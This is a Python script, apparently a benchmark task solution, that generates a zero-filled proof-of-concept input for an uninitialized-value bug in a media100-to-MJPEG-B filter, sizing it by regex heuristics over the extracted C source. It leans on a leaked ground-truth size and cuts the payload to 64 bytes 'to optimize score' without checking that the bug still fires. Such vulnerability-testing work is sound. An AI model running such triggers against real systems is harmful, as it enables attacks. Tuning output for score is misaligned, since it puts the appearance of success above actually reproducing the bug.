import tarfile
import os
import re
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the uninitialized value vulnerability in media100_to_mjpegb.
        
        Strategy:
        1. Parse the source code to identify minimum input size constraints (e.g. size checks, offset accesses).
        2. Generate a payload slightly larger than the minimum requirement to ensure execution reaches the vulnerable allocation.
        3. Fallback to the ground-truth length (1025) if analysis fails.
        """
        
        # Default fallback size based on ground truth
        poc_size = 1025
        
        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                # Open the tarball; 'r' mode allows tarfile to auto-detect compression
                with tarfile.open(src_path, 'r') as tar:
                    target_filename = 'media100_to_mjpegb_bsf.c'
                    target_member = None
                    
                    # Locate the specific source file
                    for member in tar.getmembers():
                        if member.name.endswith(target_filename):
                            target_member = member
                            break
                    
                    if target_member:
                        tar.extract(target_member, path=tmpdir)
                        source_path = os.path.join(tmpdir, target_member.name)
                        
                        if os.path.exists(source_path):
                            with open(source_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                
                                required_min = 0
                                
                                # Heuristic 1: Find explicit size checks, e.g., "if (in->size < 12)"
                                # Matches: ->size < 12, .size < 12
                                size_checks = re.findall(r'(?:>size|\.size)\s*<\s*(\d+)', content)
                                if size_checks:
                                    required_min = max(required_min, max(int(x) for x in size_checks))
                                
                                # Heuristic 2: Find fixed offset accesses, e.g., "in->data[40]"
                                # Matches: data[40]
                                offsets_brackets = re.findall(r'data\s*\[\s*(\d+)\s*\]', content)
                                if offsets_brackets:
                                    required_min = max(required_min, max(int(x) for x in offsets_brackets))
                                
                                # Heuristic 3: Find pointer arithmetic, e.g., "in->data + 40"
                                # Matches: data + 40
                                offsets_ptr = re.findall(r'data\s*\+\s*(\d+)', content)
                                if offsets_ptr:
                                    required_min = max(required_min, max(int(x) for x in offsets_ptr))
                                
                                # Determine final size
                                if required_min > 0:
                                    # Satisfy constraint + safety margin
                                    poc_size = required_min + 32
                                else:
                                    # No explicit checks found. 
                                    # Use a small standard size (64 bytes) to optimize score while staying valid for generic packets.
                                    # (Smaller than 1025 yields higher score)
                                    poc_size = 64
                                    
        except Exception:
            # If any step of analysis fails (file not found, tar error, etc.), use the safe ground truth size
            poc_size = 1025
            
        # The vulnerability is an uninitialized padding issue, which typically doesn't require specific 
        # byte values, just that the buffer is allocated and processed.
        return b'\x00' * poc_size